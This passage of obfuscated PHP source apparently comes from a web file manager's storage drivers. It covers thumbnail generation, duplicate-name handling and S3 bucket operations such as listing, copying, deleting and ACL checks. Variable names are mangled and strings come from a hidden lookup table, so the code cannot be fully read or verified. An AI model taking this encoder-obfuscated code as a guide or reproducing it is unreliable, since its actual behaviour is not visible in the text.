4) == $ŒÕÎ®“[162]) { $this->fileOutLink($Á¦‰úş¶); } $Õ¹«ä£Å = $this->info($Á¦‰úş¶); $­¾Ø–İª = !1; $Èâ‹®ú§ = isset($GLOBALS[$ŒÕÎ®“[192]]) ? $GLOBALS[$ŒÕÎ®“[192]] : array(); if ($Èâ‹®ú§ && $Èâ‹®ú§[$ŒÕÎ®“[193]] == $Õ¹«ä£Å[$ŒÕÎ®“[97]]) { $Õ¹«ä£Å = $Èâ‹®ú§; $·¡­ÔÂ = $Õ¹«ä£Å[$ŒÕÎ®“[194]]; if ($·¡­ÔÂ && isset($·¡­ÔÂ[$ŒÕÎ®“[195]])) { if ($·¡­ÔÂ[$ŒÕÎ®“[195]] <= $Ìüµ§…à && $·¡­ÔÂ[$ŒÕÎ®“[196]] <= $Ìüµ§…à) { $­¾Ø–İª = !0; } } } if ($Õ¹«ä£Å[$ŒÕÎ®“[89]] <= 1024 * 50 || $­¾Ø–İª || !function_exists($ŒÕÎ®“[197]) || $Õ¹«ä£Å[$ŒÕÎ®“[179]] == $ŒÕÎ®“[198]) { return $this->fileOut($Á¦‰úş¶, !1, $Õ¹«ä£Å[$ŒÕÎ®“[32]]); } $ÂÅï‡›ä = kodIO::hashPath($Õ¹«ä£Å); $Ì™Ó‹£ = "\143\x6f\x76\145\x72\137{$ÂÅï‡›ä}\x5f{$Ìüµ§…à}\56\x70\156\147"; $ßª‹Ÿ¶ = IO_PATH_SYSTEM_TEMP . $ŒÕÎ®“[199]; $éÊ¨“ = IO::infoFullSimple($ßª‹Ÿ¶); $¦ûµŒŒ• = $éÊ¨“ && is_array($éÊ¨“) ? $éÊ¨“[$ŒÕÎ®“[97]] : $ŒÕÎ®“[12]; if (!$¦ûµŒŒ•) { $¦ûµŒŒ• = IO::mkdir($ßª‹Ÿ¶); } if ($Õ¹«ä£Å[$ŒÕÎ®“[200]] == $ŒÕÎ®“[201] && isset($Õ¹«ä£Å[$ŒÕÎ®“[202]]) && $Õ¹«ä£Å[$ŒÕÎ®“[202]] == kodIO::sourceID($¦ûµŒŒ•)) { $‚Âáö‘” = $Õ¹«ä£Å[$ŒÕÎ®“[203]]; if ($Ìüµ§…à <= 500) { $‚£ÏİËô = preg_replace($ŒÕÎ®“[204], $ŒÕÎ®“[205], $Õ¹«ä£Å[$ŒÕÎ®“[32]]); $‚Âáö‘” = IO::fileNameExist($¦ûµŒŒ•, $‚£ÏİËô); } return IO::fileOut(KodIO::make($‚Âáö‘”), !1, $Õ¹«ä£Å[$ŒÕÎ®“[32]]); } $Û¬¤—ÀÌ = IO::fileNameExist($¦ûµŒŒ•, $Ì™Ó‹£); if ($Û¬¤—ÀÌ) { return IO::fileOut(KodIO::make($Û¬¤—ÀÌ), !1, $Õ¹«ä£Å[$ŒÕÎ®“[32]]); } if ($Ìüµ§…à > 1000) { $this->makeImageCover($¦ûµŒŒ•, $Á¦‰úş¶, $Ì™Ó‹£, $Ìüµ§…à); $this->makeImageCover($¦ûµŒŒ•, $Á¦‰úş¶, "\143\157\x76\x65\x72\137{$ÂÅï‡›ä}\x5f\x32\x35\60\56\160\x6e\x67", 250); $Û¬¤—ÀÌ = IO::fileNameExist($¦ûµŒŒ•, $Ì™Ó‹£); if ($Û¬¤—ÀÌ) { return IO::fileOut(KodIO::make($Û¬¤—ÀÌ), !1, $Õ¹«ä£Å[$ŒÕÎ®“[32]]); } die; } if (!kodIO::allowCover($Õ¹«ä£Å)) { return $this->fileOut($Á¦‰úş¶, !1, $Õ¹«ä£Å[$ŒÕÎ®“[32]]); } $©³„ÇøÃ = Cache::get($Ì™Ó‹£); if ($©³„ÇøÃ == $ŒÕÎ®“[206] || $©³„ÇøÃ == $ŒÕÎ®“[207]) { echo $©³„ÇøÃ; die; } Cache::set($Ì™Ó‹£, $ŒÕÎ®“[207], 60); $äÌ–Ÿë = array($¦ûµŒŒ•, $Õ¹«ä£Å[$ŒÕÎ®“[97]], $Ì™Ó‹£, $Ìüµ§…à); $Û»åÇ’ = $ŒÕÎ®“[208] . $Õ¹«ä£Å[$ŒÕÎ®“[89]] . $ŒÕÎ®“[209] . $Ì™Ó‹£ . $ŒÕÎ®“[210] . $Õ¹«ä£Å[$ŒÕÎ®“[32]] . $ŒÕÎ®“[211] . $Õ¹«ä£Å[$ŒÕÎ®“[97]]; TaskQueue::add($ŒÕÎ®“[212], $äÌ–Ÿë, $Û»åÇ’, $Ì™Ó‹£); } public function makeImageCover($‘‡ûùéŠ, $Ìòç¸ıè, $—Ì°÷§Œ, $·ÛõÏëÃ) { $ÎÁ³ë =& $_SERVER[ÕŸ²ó÷å]; if (IO::fileNameExist($‘‡ûùéŠ, $—Ì°÷§Œ)) { return $ÎÁ³ë[213]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $÷ŠøÍßÌ = DATA_THUMB . $—Ì°÷§Œ; del_file($÷ŠøÍßÌ); $•úĞîÍ÷ = IO::copy($Ìòç¸ıè, TEMP_FILES, !1, $—Ì°÷§Œ); if (!@file_exists($•úĞîÍ÷)) { return $ÎÁ³ë[214]; } ImageThumb::createThumb($•úĞîÍ÷, $÷ŠøÍßÌ, $·ÛõÏëÃ, $·ÛõÏëÃ * 10); if (@file_exists($÷ŠøÍßÌ)) { Cache::remove($—Ì°÷§Œ); return IO::move($÷ŠøÍßÌ, $‘‡ûùéŠ); } Cache::set($—Ì°÷§Œ, $ÎÁ³ë[206], 600); del_file($÷ŠøÍßÌ); return $ÎÁ³ë[215] . $•úĞîÍ÷ . $ÎÁ³ë[84]; } public function fileOutImageServer($ ‚òõ”Ü, $Ÿ¦åĞèğ = 250) { $this->fileOutImage($ ‚òõ”Ü, $Ÿ¦åĞèğ); } public function fileNameAuto($•‡°‘âÊ, $ô´ÅÁş, $ã™á±ó˜ = REPEAT_RENAME, $›Ö¹¥¬É = false) { $¡ÜÛÃ¦Ë =& $_SERVER[ÕŸ²ó÷å]; $ãØÒóñ = $•‡°‘âÊ === $¡ÜÛÃ¦Ë[12] ? $ô´ÅÁş : rtrim($•‡°‘âÊ, $¡ÜÛÃ¦Ë[8]) . $¡ÜÛÃ¦Ë[8] . $ô´ÅÁş; if ($ã™á±ó˜ == REPEAT_REPLACE || !$this->exist($ãØÒóñ) || $›Ö¹¥¬É && $ã™á±ó˜ != REPEAT_RENAME_FOLDER) { return $ô´ÅÁş; } if ($ã™á±ó˜ == REPEAT_SKIP) { return !1; } $¢ôßØ’û = $¡ÜÛÃ¦Ë[10] . get_path_ext($ô´ÅÁş); $¢ôßØ’û = $¢ôßØ’û == $¡ÜÛÃ¦Ë[10] || $›Ö¹¥¬É ? $¡ÜÛÃ¦Ë[12] : $¢ôßØ’û; $ÏË¾„õ¹ = 1; $òÁŒ˜Óœ = substr($ô´ÅÁş, 0, strlen($ô´ÅÁş) - strlen($¢ôßØ’û)); $È„ÑµÍ› = $òÁŒ˜Óœ . "\x28{$ÏË¾„õ¹}\x29{$¢ôßØ’û}"; while ($this->exist(rtrim($•‡°‘âÊ, $¡ÜÛÃ¦Ë[8]) . $¡ÜÛÃ¦Ë[8] . $È„ÑµÍ›)) { $È„ÑµÍ› = $òÁŒ˜Óœ . "\x28{$ÏË¾„õ¹}\51{$¢ôßØ’û}"; $ÏË¾„õ¹++; } return $È„ÑµÍ›; } private function fileNameAutoList($µî±³ÄŸ, $Ë™ßˆ³æ, $àß§³¿™ = false) { $³ƒáç´à =& $_SERVER[ÕŸ²ó÷å]; $á„‚ı¿¸ = $this->listPath($µî±³ÄŸ, !0); $á„‚ı¿¸ = array_merge($á„‚ı¿¸[$³ƒáç´à[95]], $á„‚ı¿¸[$³ƒáç´à[96]]); $íÄä¯† = array_to_keyvalue($á„‚ı¿¸, $³ƒáç´à[12], $³ƒáç´à[32]); $íŸƒˆµú = $³ƒáç´à[10] . get_path_ext($Ë™ßˆ³æ); $íŸƒˆµú = $íŸƒˆµú == $³ƒáç´à[10] || $àß§³¿™ ? $³ƒáç´à[12] : $íŸƒˆµú; $¶˜•ƒ = substr($Ë™ßˆ³æ, 0, strlen($Ë™ßˆ³æ) - strlen($íŸƒˆµú)); $ğâòÒó¨ = $¶˜•ƒ . "\x28\x30\x29{$íŸƒˆµú}"; for ($ƒû»Š©µ = 1; $ƒû»Š©µ <= count($íÄä¯†) + 1; $ƒû»Š©µ++) { $ğâòÒó¨ = $¶˜•ƒ . "\x28{$ƒû»Š©µ}\51{$íŸƒˆµú}"; if (!in_array_not_case($ğâòÒó¨, $íÄä¯†)) { return $ğâòÒó¨; } } return $ğâòÒó¨; } public function listAllFiles($ôæ¡ş“, $°Áºò´Œ) { $‚ÙñÕáÈ =& $_SERVER[ÕŸ²ó÷å]; if (empty($°Áºò´Œ)) { return array(); } $œ«ôµĞ = array_keys($°Áºò´Œ); $Ã’¶Êµ’ = array(); $ôæ¡ş“ = trim($ôæ¡ş“, $‚ÙñÕáÈ[8]); foreach ($°Áºò´Œ as $åö¡•á“ => $¾âí) { $ÄæŞƒ‹® = ltrim(substr(trim($åö¡•á“, $‚ÙñÕáÈ[8]), strlen($ôæ¡ş“)), $‚ÙñÕáÈ[8]); if (substr($åö¡•á“, -1) == $‚ÙñÕáÈ[8]) { $ÄæŞƒ‹® = rtrim($ÄæŞƒ‹®, $‚ÙñÕáÈ[8]) . $‚ÙñÕáÈ[8]; } $Ã’¶Êµ’ = array_merge($Ã’¶Êµ’, $this->slicePath($ÄæŞƒ‹®)); } $§ïÁĞú = array(); foreach (array_unique($Ã’¶Êµ’) as $ÜÏÌëğ) { $Ø¨µ‹µÈ = array($‚ÙñÕáÈ[97] => $this->getPathOuter($‚ÙñÕáÈ[8] . $ôæ¡ş“ . $‚ÙñÕáÈ[8] . $ÜÏÌëğ), $‚ÙñÕáÈ[88] => 1, $‚ÙñÕáÈ[89] => 0); if (substr($ÜÏÌëğ, -1) != $‚ÙñÕáÈ[8]) { $Ø¨µ‹µÈ[$‚ÙñÕáÈ[88]] = 0; $§òª”¤© = $this->getPath($ôæ¡ş“ . $‚ÙñÕáÈ[8] . $ÜÏÌëğ); if (isset($°Áºò´Œ[$§òª”¤©])) { $´˜ı…ƒ = $°Áºò´Œ[$§òª”¤©]; if (isset($´˜ı…ƒ[$‚ÙñÕáÈ[89]])) { $Ø¨µ‹µÈ[$‚ÙñÕáÈ[89]] = intval($´˜ı…ƒ[$‚ÙñÕáÈ[89]]); } if (isset($´˜ı…ƒ[$‚ÙñÕáÈ[216]])) { $Ø¨µ‹µÈ[$‚ÙñÕáÈ[98]] = intval($´˜ı…ƒ[$‚ÙñÕáÈ[216]]); } } } $§ïÁĞú[] = $Ø¨µ‹µÈ; } return $§ïÁĞú; } public function slicePath($õıØ©”°) { $“ö æ ñ =& $_SERVER[ÕŸ²ó÷å]; $ŸÇ›«¼ = explode($“ö æ ñ[8], trim($õıØ©”°, $“ö æ ñ[8])); $Ú‹òğŒ‘ = 0; do { ++$Ú‹òğŒ‘; $¦Á÷õÇ[] = implode($“ö æ ñ[8], array_slice($ŸÇ›«¼, 0, $Ú‹òğŒ‘)) . $“ö æ ñ[8]; } while ($Ú‹òğŒ‘ < count($ŸÇ›«¼)); $¦Á÷õÇ[count($ŸÇ›«¼) - 1] = $õıØ©”°; return $¦Á÷õÇ; } public function getHost() { $‹ÁÔÉŞ¢ =& $_SERVER[ÕŸ²ó÷å]; $®õç½Éœ = parse_url(trim($this->domain, $‹ÁÔÉŞ¢[8])); $Û“ıÅĞ¤ = isset($®õç½Éœ[$‹ÁÔÉŞ¢[217]]) ? $®õç½Éœ[$‹ÁÔÉŞ¢[217]] : http_type(); $Ã¡ÚœõÒ = isset($®õç½Éœ[$‹ÁÔÉŞ¢[218]]) ? $®õç½Éœ[$‹ÁÔÉŞ¢[218]] : $®õç½Éœ[$‹ÁÔÉŞ¢[97]]; if (isset($®õç½Éœ[$‹ÁÔÉŞ¢[219]])) { $Ã¡ÚœõÒ .= $‹ÁÔÉŞ¢[4] . $®õç½Éœ[$‹ÁÔÉŞ¢[219]]; } return $Û“ıÅĞ¤ . $‹ÁÔÉŞ¢[220] . $Ã¡ÚœõÒ; } public function pathEncode($ä­˜ãÀ) { $ĞŞäïâú =& $_SERVER[ÕŸ²ó÷å]; return str_replace($ĞŞäïâú[221], $ĞŞäïâú[8], rawurlencode($ä­˜ãÀ)); } public function writeLog($ıš»°“¶ = '', $óØëÆ» = false) { $’°‰³İ¸ =& $_SERVER[ÕŸ²ó÷å]; $–ïƒÌ› = in_array(ACTION, array($’°‰³İ¸[222], $’°‰³İ¸[223])); if (!$–ïƒÌ› && !GLOBAL_DEBUG) { return; } $ç‘´ŸÏÃ = $ıš»°“¶; static $€Ñ¼Ö¯¼ = null; if (!$€Ñ¼Ö¯¼) { $€Ñ¼Ö¯¼ = strtoupper($this->getType()); } $ıš»°“¶ = $€Ñ¼Ö¯¼ . $’°‰³İ¸[224] . $ıš»°“¶; if ($óØëÆ») { $ºÅËëƒº = error_get_last(); if ($ºÅËëƒº) { $ıš»°“¶ = array($ıš»°“¶, $ºÅËëƒº); } } write_log($ıš»°“¶, $’°‰³İ¸[225]); if ($–ïƒÌ›) { throw new Exception($ç‘´ŸÏÃ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÉÌ™Ó) { set_timeout(); require_once SDK_DIR . $_SERVER[ÕŸ²ó÷å][226]; parent::__construct(); $this->_init($ÉÌ™Ó); } public function _init($ìúùÚƒ‡) { $„¦ØõõÎ =& $_SERVER[ÕŸ²ó÷å]; $this->config = $ìúùÚƒ‡; foreach ($ìúùÚƒ‡ as $ï•‘Òİ => $Ø  š”) { if (isset($this->{$ï•‘Òİ})) { $this->{$ï•‘Òİ} = $Ø  š”; } } $this->endpoint = $ìúùÚƒ‡[$„¦ØõõÎ[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($„¦ØõõÎ[222], $„¦ØõõÎ[223]))) { $this->client->setExceptions(); } } public function setSignVersion($òçôÑ = "\166\x34") { $this->signVer = $òçôÑ; $this->client->setSignatureVersion($òçôÑ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $òú¨«‘‹) { return null; } } public function isBucketCors() { $ºêûâÑ¯ =& $_SERVER[ÕŸ²ó÷å]; $æıÜüãı = $this->getBucketCors(); if (!$æıÜüãı || !is_array($æıÜüãı)) { return !1; } if (!is_array($æıÜüãı[$ºêûâÑ¯[228]])) { $æıÜüãı[$ºêûâÑ¯[228]] = explode($ºêûâÑ¯[50], $æıÜüãı[$ºêûâÑ¯[228]]); } if ($æıÜüãı[$ºêûâÑ¯[229]] != $ºêûâÑ¯[230] || !in_array($ºêûâÑ¯[230], $æıÜüãı[$ºêûâÑ¯[228]])) { return !1; } $¬–¸õğ¤ = array_map($ºêûâÑ¯[231], $æıÜüãı[$ºêûâÑ¯[232]]); if (!is_array($¬–¸õğ¤)) { $¬–¸õğ¤ = array(); } $×¥ıõ×ö = array($ºêûâÑ¯[233], $ºêûâÑ¯[234], $ºêûâÑ¯[235], $ºêûâÑ¯[236], $ºêûâÑ¯[237]); $Ÿ–¶„¤• = array_diff($×¥ıõ×ö, $¬–¸õğ¤); return empty($Ÿ–¶„¤•); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ü€×ß‘İ, $Èˆ°—Â = '', $È–åÑ¼÷ = REPEAT_RENAME) { $ÃØ­ëøæ = $this->setContent($Ü€×ß‘İ, $Èˆ°—Â); if ($ÃØ­ëøæ !== !1) { return $this->getPathOuter($Ü€×ß‘İ); } return !1; } public function mkdir($İ…Œ÷¤š, $––£®ó = REPEAT_SKIP) { $¥ÛŒŠÉ =& $_SERVER[ÕŸ²ó÷å]; if (empty($İ…Œ÷¤š) && $İ…Œ÷¤š !== $¥ÛŒŠÉ[238]) { return !1; } if ($––£®ó && $this->_isFolder($İ…Œ÷¤š)) { return $this->getPathOuter($İ…Œ÷¤š); } $Ã”âî¯— = $this->setContent($İ…Œ÷¤š, $¥ÛŒŠÉ[12], !0); if ($Ã”âî¯— !== !1) { return $this->getPathOuter($İ…Œ÷¤š); } return !1; } public function copyFile($î»¤ÂœÇ, $ ¯½„¯·, $İâ¿µáş = array()) { $›èˆÑõ =& $_SERVER[ÕŸ²ó÷å]; $÷Æú—òï = $this->objectMeta($î»¤ÂœÇ); if (!$÷Æú—òï) { return !1; } if ($÷Æú—òï[$›èˆÑõ[89]] <= 1024 * 1024 * 200) { $³®Èá¶× = $this->client->copyObject($this->bucket, $î»¤ÂœÇ, $this->bucket, $ ¯½„¯·, $›èˆÑõ[239], $İâ¿µáş); } else { $³®Èá¶× = $this->client->multiCopyObject($this->bucket, $î»¤ÂœÇ, $this->bucket, $ ¯½„¯·, $İâ¿µáş); } $³®Èá¶× = $³®Èá¶× ? $this->getPathOuter($ ¯½„¯·) : !1; return $³®Èá¶×; } public function moveFile($ß”Û£Ó¹, $¶â»ÕºÖ) { if ($this->copyFile($ß”Û£Ó¹, $¶â»ÕºÖ)) { $this->delFile($ß”Û£Ó¹); return $this->getPathOuter($¶â»ÕºÖ); } return !1; } public function delFile($¬Œ¬éüœ) { return $this->client->deleteObject($this->bucket, $¬Œ¬éüœ); } public function delFolder($Õö» €ï) { $×ŸÍğ• =& $_SERVER[ÕŸ²ó÷å]; if (!$this->exist($Õö» €ï)) { return !0; } $this->listItemCache = !1; $„Æ«²°Ì = $this->fileList($Õö» €ï); $this->listItemCache = !0; $·ª¸½º = trim($Õö» €ï, $×ŸÍğ•[8]) . $×ŸÍğ•[8]; if (!empty($Õö» €ï) && $Õö» €ï !== $×ŸÍğ•[238] && !in_array($·ª¸½º, $„Æ«²°Ì[$×ŸÍğ•[95]])) { $„Æ«²°Ì[$×ŸÍğ•[95]][] = $·ª¸½º; } $¥Ÿ½Ãïğ = $this->delByBatch($„Æ«²°Ì[$×ŸÍğ•[96]]); if (!$¥Ÿ½Ãïğ) { return !1; } $¥Ÿ½Ãïğ = $this->delByBatch($„Æ«²°Ì[$×ŸÍğ•[95]]); if (!$¥Ÿ½Ãïğ) { return !1; } return $this->delFile($·ª¸½º); } private function delByBatch($Ô‰Ò‰Ì) { foreach (array_chunk($Ô‰Ò‰Ì, 1000) as $ÌÑˆ¸™ç) { $ªßÂİ›§ = $this->client->deleteObjects($this->bucket, $ÌÑˆ¸™ç); if (!$ªßÂİ›§) { return !1; } } return !0; } public function rename($íÈ®£‹ì, $ÌÊ¼ÇÜú) { return $this->renameObject($íÈ®£‹ì, $ÌÊ¼ÇÜú); } public function listPath($È éñò, $»åÓÈ¦Ú = false) { $·µ—‹ıé =& $_SERVER[ÕŸ²ó÷å]; $¾µÖÂÊÛ = $this->fileList($È éñò, $·µ—‹ıé[8], !0); foreach ($¾µÖÂÊÛ[$·µ—‹ıé[95]] as $ˆª˜»èÂ => $š¤€¨Ñ®) { $¾µÖÂÊÛ[$·µ—‹ıé[95]][$ˆª˜»èÂ] = $this->folderInfo($š¤€¨Ñ®, $»åÓÈ¦Ú, $š¤€¨Ñ®); } foreach ($¾µÖÂÊÛ[$·µ—‹ıé[96]] as $ˆª˜»èÂ => $š¤€¨Ñ®) { $¾µÖÂÊÛ[$·µ—‹ıé[96]][$ˆª˜»èÂ] = $this->fileInfo($š¤€¨Ñ®[$·µ—‹ıé[32]], $»åÓÈ¦Ú, $š¤€¨Ñ®); } return $¾µÖÂÊÛ; } protected function infoChildren($ ñŠÅªğ, &$†ù«×ëê) { $ª—éì‹³ =& $_SERVER[ÕŸ²ó÷å]; $³¢”¾‚Ë = $this->fileList($ ñŠÅªğ, $ª—éì‹³[12], !0); $†ù«×ëê[$ª—éì‹³[91]] += count($³¢”¾‚Ë[$ª—éì‹³[95]]); $†ù«×ëê[$ª—éì‹³[90]] += count($³¢”¾‚Ë[$ª—éì‹³[96]]); foreach ($³¢”¾‚Ë[$ª—éì‹³[96]] as $”òùÊ“) { if (!$”òùÊ“ || !$”òùÊ“[$ª—éì‹³[89]]) { continue; } $†ù«×ëê[$ª—éì‹³[89]] += $”òùÊ“[$ª—éì‹³[89]]; } } private function fileInfo($ÂŒÜØ¤ò, $Ó²Áí¢” = false, $ş›„æ»Œ = array()) { $ÉÑûÉ¦Ú =& $_SERVER[ÕŸ²ó÷å]; $ÆéÉ¾› = array($ÉÑûÉ¦Ú[32] => $this->pathThis($ÂŒÜØ¤ò), $ÉÑûÉ¦Ú[97] => $this->getPathOuter($ÂŒÜØ¤ò), $ÉÑûÉ¦Ú[33] => $ÉÑûÉ¦Ú[240], $ÉÑûÉ¦Ú[179] => $this->ext($ÂŒÜØ¤ò), $ÉÑûÉ¦Ú[89] => isset($ş›„æ»Œ[$ÉÑûÉ¦Ú[89]]) ? $ş›„æ»Œ[$ÉÑûÉ¦Ú[89]] : 0); if ($Ó²Áí¢”) { return $ÆéÉ¾›; } $ÆéÉ¾›[$ÉÑûÉ¦Ú[241]] = $ÆéÉ¾›[$ÉÑûÉ¦Ú[98]] = 0; $ÆéÉ¾›[$ÉÑûÉ¦Ú[242]] = $ÆéÉ¾›[$ÉÑûÉ¦Ú[243]] = !0; if (empty($ş›„æ»Œ)) { $ş›„æ»Œ = $this->objectMeta($ÂŒÜØ¤ò); if (!$ş›„æ»Œ) { return $ÆéÉ¾›; } } if (isset($ş›„æ»Œ[$ÉÑûÉ¦Ú[244]]) && $ş›„æ»Œ[$ÉÑûÉ¦Ú[244]]) { $ÆéÉ¾›[$ÉÑûÉ¦Ú[245]] = $ş›„æ»Œ[$ÉÑûÉ¦Ú[244]]; } if (isset($ş›„æ»Œ[$ÉÑûÉ¦Ú[216]])) { $ÆéÉ¾›[$ÉÑûÉ¦Ú[98]] = $ş›„æ»Œ[$ÉÑûÉ¦Ú[216]]; } if (isset($ş›„æ»Œ[$ÉÑûÉ¦Ú[89]])) { $ÆéÉ¾›[$ÉÑûÉ¦Ú[89]] = $ş›„æ»Œ[$ÉÑûÉ¦Ú[89]]; } return $ÆéÉ¾›; } private function folderInfo($ƒÓ·ÔÍ, $©ÚïÔŠ™ = false, $‰¨Í‰Şé = array()) { $¿‘ˆ¤ê =& $_SERVER[ÕŸ²ó÷å]; $ï«ŞâĞ½ = array($¿‘ˆ¤ê[32] => $this->pathThis($ƒÓ·ÔÍ), $¿‘ˆ¤ê[97] => $this->getPathOuter($¿‘ˆ¤ê[8] . $ƒÓ·ÔÍ), $¿‘ˆ¤ê[33] => $¿‘ˆ¤ê[88]); if ($©ÚïÔŠ™) { return $ï«ŞâĞ½; } $ï«ŞâĞ½[$¿‘ˆ¤ê[241]] = $ï«ŞâĞ½[$¿‘ˆ¤ê[98]] = 0; $ï«ŞâĞ½[$¿‘ˆ¤ê[242]] = $ï«ŞâĞ½[$¿‘ˆ¤ê[243]] = !0; if ($ƒÓ·ÔÍ == $¿‘ˆ¤ê[12]) { return $ï«ŞâĞ½; } if (empty($‰¨Í‰Şé)) { $‰¨Í‰Şé = $this->objectMeta(trim($ƒÓ·ÔÍ, $¿‘ˆ¤ê[8]) . $¿‘ˆ¤ê[8]); } if (isset($‰¨Í‰Şé[$¿‘ˆ¤ê[216]])) { $ï«ŞâĞ½[$¿‘ˆ¤ê[241]] = $‰¨Í‰Şé[$¿‘ˆ¤ê[216]]; } return $ï«ŞâĞ½; } private function fileList($¦”Êİ¶, $û“ÑÎ°Õ = '', $á‰¡Û–ì = 0) { $¦Áøí” =& $_SERVER[ÕŸ²ó÷å]; $Ü„Åí—• = rtrim($¦”Êİ¶, $¦Áøí”[8]) . $¦Áøí”[8]; $ş’Œñ¥• = $this->listObjs($Ü„Åí—•, null, null, $û“ÑÎ°Õ); if (!$ş’Œñ¥•) { return array($¦Áøí”[95] => array(), $¦Áøí”[96] => array()); } $Öûûé£½ = $šÑ¶ğÇ’ = array(); foreach ($ş’Œñ¥•[$¦Áøí”[246]] as $±Ü§Üå) { $Ğ»Èù•ê = $±Ü§Üå[$¦Áøí”[32]]; if ($Ğ»Èù•ê == $Ü„Åí—•) { continue; } $ˆ²©°à¹ = isset($±Ü§Üå[$¦Áøí”[89]]) ? $±Ü§Üå[$¦Áøí”[89]] : 0; $²½’à­é = $ˆ²©°à¹ == 0 && substr($Ğ»Èù•ê, strlen($Ğ»Èù•ê) - 1, 1) == $¦Áøí”[8] ? !0 : !1; $this->cacheMethodInfoSet($Ğ»Èù•ê, $²½’à­é, $±Ü§Üå); if ($²½’à­é) { $Öûûé£½[] = $Ğ»Èù•ê; continue; } $šÑ¶ğÇ’[] = $á‰¡Û–ì ? $±Ü§Üå : $Ğ»Èù•ê; } foreach ($ş’Œñ¥•[$¦Áøí”[247]] as $±Ü§Üå) { $Öûûé£½[] = $±Ü§Üå[$¦Áøí”[32]]; $this->cacheMethodInfoSet($±Ü§Üå[$¦Áøí”[32]], !0); } $this->cacheMethodInfoSet($¦”Êİ¶, !0); return array($¦Áøí”[95] => $Öûûé£½, $¦Áøí”[96] => $šÑ¶ğÇ’); } private function listObjs($¢ÔÃË¯, $â‚Şº›› = null, $¬¶–Î¢‰ = null, $İ€¡¸ë„ = null) { $ı½²±¸ß =& $_SERVER[ÕŸ²ó÷å]; $¢ÔÃË¯ = trim($¢ÔÃË¯, $ı½²±¸ß[8]); $‡’ã†ØÛ = empty($¢ÔÃË¯) && $¢ÔÃË¯ !== $ı½²±¸ß[238] ? $ı½²±¸ß[12] : $¢ÔÃË¯ . $ı½²±¸ß[8]; return $this->client->getBucket($this->bucket, $‡’ã†ØÛ, $â‚Şº››, $¬¶–Î¢‰, $İ€¡¸ë„, !0); } public function has($”ãı‘óè, $¤™™ú½¬ = false, $ÕĞ”š¯ = true) { $–æçâÙ½ =& $_SERVER[ÕŸ²ó÷å]; $”ãı‘óè = trim($”ãı‘óè, $–æçâÙ½[8]); $Ù¥ÖşÂ = empty($”ãı‘óè) && $”ãı‘óè !== $–æçâÙ½[238] ? $–æçâÙ½[12] : $”ãı‘óè . $–æçâÙ½[8]; $ü´‹‹ğ‰ = null; $üÍñÕæ = 500; $ÌÈò¹û­ = $–æçâÙ½[8]; $Òõ‹ò½ß = $¥ÌÎ©öÕ = array(); while (!0) { $İ¿“×Æ“ = $this->listObjs($”ãı‘óè, $ü´‹‹ğ‰, $üÍñÕæ, $ÌÈò¹û­); if (!$İ¿“×Æ“) { break; } $ü´‹‹ğ‰ = $İ¿“×Æ“[$–æçâÙ½[248]]; $ÛÅó¢• = $İ¿“×Æ“[$–æçâÙ½[246]]; $¿»‚ëÚ‘ = $İ¿“×Æ“[$–æçâÙ½[247]]; if (empty($ÛÅó¢•) && empty($¿»‚ëÚ‘)) { break; } if (count($ÛÅó¢•) == 1 && $ÛÅó¢•[0][$–æçâÙ½[32]] == $Ù¥ÖşÂ) { break; } if ($¤™™ú½¬) { if (count($ÛÅó¢•)) { $ÛÅó¢• = array_column($ÛÅó¢•, $–æçâÙ½[32]); $Òõ‹ò½ß = array_merge($Òõ‹ò½ß, $ÛÅó¢•); } if (count($¿»‚ëÚ‘)) { $¿»‚ëÚ‘ = array_column($¿»‚ëÚ‘, $–æçâÙ½[32]); $¥ÌÎ©öÕ = array_merge($¥ÌÎ©öÕ, $¿»‚ëÚ‘); } if ($ü´‹‹ğ‰ === null) { break; } continue; } if ($ÕĞ”š¯) { if (!empty($ÛÅó¢•)) { if (count($ÛÅó¢•) > 1 || isset($ÛÅó¢•[0][$–æçâÙ½[32]]) && $ÛÅó¢•[0][$–æçâÙ½[32]] != $Ù¥ÖşÂ) { return !0; } } } else { if (!empty($¿»‚ëÚ‘)) { return !0; } } if ($ü´‹‹ğ‰ === null) { break; } } if ($¤™™ú½¬) { $Òõ‹ò½ß = array_diff($Òõ‹ò½ß, array($Ù¥ÖşÂ)); $Òõ‹ò½ß = count(array_unique($Òõ‹ò½ß)); $¥ÌÎ©öÕ = count(array_unique($¥ÌÎ©öÕ)); return array($–æçâÙ½[249] => $Òõ‹ò½ß, $–æçâÙ½[250] => $¥ÌÎ©öÕ); } return !1; } public function listAll($›ªË± ¶) { $˜ŠŸÙÏÖ =& $_SERVER[ÕŸ²ó÷å]; $ğÏÉ‡Éä = $this->fileList($›ªË± ¶, $˜ŠŸÙÏÖ[12], !0); $£Ùô˜Áğ = array_to_keyvalue($ğÏÉ‡Éä[$˜ŠŸÙÏÖ[96]], $˜ŠŸÙÏÖ[32]); foreach ($ğÏÉ‡Éä[$˜ŠŸÙÏÖ[95]] as $éêÄöœ€) { if (is_string($éêÄöœ€)) { $£Ùô˜Áğ[$éêÄöœ€] = array($˜ŠŸÙÏÖ[89] => 0); } } return $this->listAllFiles($›ªË± ¶, $£Ùô˜Áğ); } public function canRead($úİï­Š) { $×¯¿‡‹¶ =& $_SERVER[ÕŸ²ó÷å]; $‰ÛÜØüĞ = $this->client->getAccessControlPolicy($this->bucket, $úİï­Š); if (!$‰ÛÜØüĞ) { return !1; } return in_array($‰ÛÜØüĞ, array($×¯¿‡‹¶[251], $×¯¿‡‹¶[252], $×¯¿‡‹¶[253])) ? !0 : !1; } public function canWrite($¦šú¦ìÒ) { $ıñá =& $_SERVER[ÕŸ²ó÷å]; $œèîóİ = $this->client->getAccessControlPolicy($this->bucket, $¦šú¦ìÒ); if (!$œèîóİ) { return !1; } return in_array($œèîóİ, array($ıñá[251], 